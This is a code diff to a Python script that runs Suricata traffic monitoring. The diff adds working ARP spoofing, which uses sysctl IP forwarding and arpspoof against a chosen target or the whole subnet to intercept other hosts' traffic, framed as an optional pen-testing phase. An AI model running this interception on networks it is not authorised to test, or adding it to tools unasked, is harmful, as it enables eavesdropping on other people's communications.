@@ -43,6 +43,52 @@ def setup_output_dir():
         log(f"Failed to create directory '{out_dir}': {e}", "ERROR")
         sys.exit(1)
 
+def set_ip_forwarding(enable=True):
+    """Enables or disables IP forwarding to act as a router during ARP Spoofing."""
+    val = "1" if enable else "0"
+    state = "Enabling" if enable else "Disabling"
+    log(f"{state} IP Forwarding...", "INFO")
+    try:
+        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={val}"], capture_output=True, check=True)
+    except Exception as e:
+        log(f"Failed to set IP forwarding. Interception might drop victim's internet: {e}", "WARN")
+
+def start_arp_spoofing(interface, gateway_ip, target_ip=""):
+    """Starts bidirectional ARP spoofing to capture whole network/target traffic."""
+    procs = []
+    try:
+        # Verify arpspoof is installed (part of dsniff)
+        subprocess.run(["arpspoof", "-h"], capture_output=True)
+        
+        log(f"Initiating ARP Spoofing on {interface} to intercept traffic...", "WARN")
+        
+        # We need the user to either spoof exactly one target or the entire subnet
+        if target_ip:
+            log(f"  --> Spoofing specific Target: {target_ip} <--> Gateway: {gateway_ip}", "WARN")
+            p1 = subprocess.Popen(["arpspoof", "-i", interface, "-t", target_ip, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            p2 = subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway_ip, target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            procs.extend([p1, p2])
+        else:
+            log(f"  --> Spoofing ENTIRE SUBNET <--> Gateway: {gateway_ip}", "WARN")
+            p1 = subprocess.Popen(["arpspoof", "-i", interface, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            procs.append(p1)
+            
+        log("ARP Spoofing is now running actively in the background.", "SUCCESS")
+        return procs
+        
+    except FileNotFoundError:
+        log("'arpspoof' is missing! Install via 'sudo apt install dsniff'. Suricata will only log local traffic.", "ERROR")
+        return []
+
+def stop_arp_spoofing(procs):
+    """Terminates ARP spoofing processes safely."""
+    if procs:
+        log("Stopping active interception (ARP Spoofing) and cleaning up...", "INFO")
+        for p in procs:
+            p.terminate()
+            p.wait(timeout=5)
+        log("Target traffic routing restored to normal.", "SUCCESS")
+
 def compile_results(out_dir):
     """Parses Suricata logs and consolidates them into a single file."""
     log("Consolidating Suricata logs into a single report...", "INFO")
@@ -85,6 +131,7 @@ def compile_results(out_dir):
                 os.remove(file)
                 
         log("Cleaned up raw JSON and scattered log files.", "INFO")
+        log(f"Report successfully compiled into: {final_report_path}", "SUCCESS")
         
     except Exception as e:
         log(f"Error compiling final report: {e}", "ERROR")
@@ -102,13 +149,10 @@ def run_suricata(out_dir, interface, duration_mins=5):
         subprocess.run(["suricata", "-V"], capture_output=True, check=True)
         
         # Run Suricata: -i <interface>, -l <log_dir>
-        # We output standard terminal execution logs to a text file.
-        # Suricata outputs its primary findings (alerts, network flows, file transfers) into the log dir (eve.json, fast.log, stats.log).
         with open(suricata_console_log, "w") as f:
             process = subprocess.Popen(["suricata", "-i", interface, "-l", out_dir], stdout=f, stderr=subprocess.STDOUT)
             
             log(f"Suricata is now capturing and analyzing traffic on {interface}...", "SUCCESS")
-            log(f"While running, check '{os.path.join(out_dir, 'eve.json')}' to see real-time protocol identification and file transfer metadata.", "INFO")
             
             # Simple progress monitor
             elapsed = 0
@@ -143,6 +187,9 @@ def main():
         log("WARNING: This script highly depends on raw access to interfaces. It should be run as root (sudo).", "WARN")
         time.sleep(2)
         
+    arpspoof_procs = []
+    is_spoofing = False
+    
     try:
         # Request interface input
         interface = input("\nEnter network interface to monitor (e.g., eth0, wlan0) [default: eth0]: ").strip()
@@ -152,20 +199,39 @@ def main():
             
         duration_input = input("Enter duration to monitor in minutes [default: 5]: ").strip()
         duration_mins = int(duration_input) if duration_input.isdigit() else 5
+        
+        # Active Pen-Testing Setup
+        print("\n--- Phase 1: Network Setup ---")
+        spoof_choice = input("Enable Active ARP Spoofing to intercept WHOLE network traffic? (y/N): ").strip().lower()
+        if spoof_choice == 'y':
+            gateway_ip = input("  Enter the Router/Gateway IP (e.g., 192.168.1.1): ").strip()
+            target_ip = input("  Enter the Target IP (leave empty to intercept ALL subnet traffic): ").strip()
             
+            if gateway_ip:
+                is_spoofing = True
+                set_ip_forwarding(enable=True)
+                arpspoof_procs = start_arp_spoofing(interface, gateway_ip, target_ip)
+            else:
+                log("Router/Gateway IP is absolutely required to arp spoof. Bypassing interception.", "WARN")
+        
         out_dir = setup_output_dir()
         
-        print("\n--- Phase 1: Live Monitoring ---")
+        print("\n--- Phase 2: Live Monitoring ---")
         run_suricata(out_dir, interface, duration_mins=duration_mins)
         
         print("\n==========================================================")
-        log(f"Monitoring complete!", "SUCCESS")
-        log(f"Compiled report is located at: '{os.path.abspath(os.path.join(out_dir, 'data_transfer_report.txt'))}'", "SUCCESS")
-        log(f"Raw logging files were successfully cleaned up.", "INFO")
+        log(f"Monitoring Phase complete!", "SUCCESS")
         
     except KeyboardInterrupt:
         print("\n")
-        log("Monitoring forcefully interrupted by user. Exiting...", "WARN")
+        log("Monitoring forcefully interrupted by user.", "WARN")
+    finally:
+        # Ensure we always clean up the malicious routing rules if we crash or exit!
+        if is_spoofing:
+            print("\n--- Clean-up Phase ---")
+            stop_arp_spoofing(arpspoof_procs)
+            set_ip_forwarding(enable=False)
+            
         sys.exit(0)
 
 if __name__ == "__main__":
